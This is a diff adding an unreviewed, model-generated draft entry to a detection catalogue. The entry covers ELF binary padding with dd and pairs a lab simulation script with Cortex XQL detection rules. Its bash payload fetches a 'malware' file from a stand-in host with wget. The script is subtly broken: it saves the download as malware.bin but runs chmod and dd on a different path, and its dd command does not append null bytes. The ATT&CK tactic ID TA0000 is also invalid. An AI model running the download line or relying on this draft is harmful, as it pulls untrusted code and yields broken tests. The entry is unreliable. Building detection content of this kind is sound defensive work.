@@ -1,0 +1,150 @@
+{
+  "id": "TTP-0000-0032",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "ELF Padding with dd to Evade Hash/Size Detection",
+    "summary": "An attacker uses the dd command to append null bytes to an ELF binary, inflating its size and altering its hash to evade detection. Cortex should identify this behavior as possible binary padding.",
+    "description": "An attacker uses the dd command to append null bytes to an ELF binary, inflating its size and altering its hash to evade detection. Cortex should identify this behavior as possible binary padding."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1027",
+        "subtechnique_id": "T1027.001",
+        "name": "T1027.001",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/malware.bin https://example.com/malware\nchmod +x /tmp/scratch/malware\n/bin/dd if=/tmp/scratch/malware of=/tmp/scratch/padded_malware bs=1024 count=1024 conv=notrunc\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "Padded ELF binary file",
+        "expected_value": "action_file_path contains '/tmp/scratch/padded_malware'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process executing dd command",
+        "expected_value": "action_process_image_name = '/bin/dd'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Possible Binary Padding Using dd",
+        "description": "Detection of dd command being used to append null bytes to an ELF binary",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/dd'\n| filter action_process_command_line contains 'conv=notrunc'",
+        "mitre_technique_ids": [
+          "T1027.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Possible binary padding using dd",
+        "description": "Detection of dd command being used to append null bytes to an ELF binary to evade hash/size detection",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/dd'\n| filter action_process_command_line contains 'conv=notrunc'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_process_image_name = '/bin/dd'",
+        "mitre_technique_ids": [
+          "T1027.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Process Start - dd with conv=notrunc",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/dd'\n| filter action_process_command_line contains 'conv=notrunc'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Possible binary padding using dd; Required Data: XDR Agent; ATT&CK T1027.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Possible binary padding using dd",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/possible-binary-padding-using-dd",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1027.001",
+      "url": "https://attack.mitre.org/techniques/T1027/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
